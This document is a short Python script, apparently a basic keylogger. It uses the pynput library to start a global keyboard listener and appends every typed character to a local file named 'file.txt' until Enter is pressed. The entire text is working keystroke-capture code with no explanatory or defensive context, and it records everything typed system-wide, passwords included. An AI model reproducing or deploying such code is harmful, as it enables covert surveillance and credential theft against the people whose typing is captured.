from pynput import keyboard

def keyPressed(key):
    try:
        with open("file.txt","a") as file:
            char=key.char
            file.write(char)
    except:
        print("error ocurred getting keys")

if __name__=="__main__":
    listener=keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
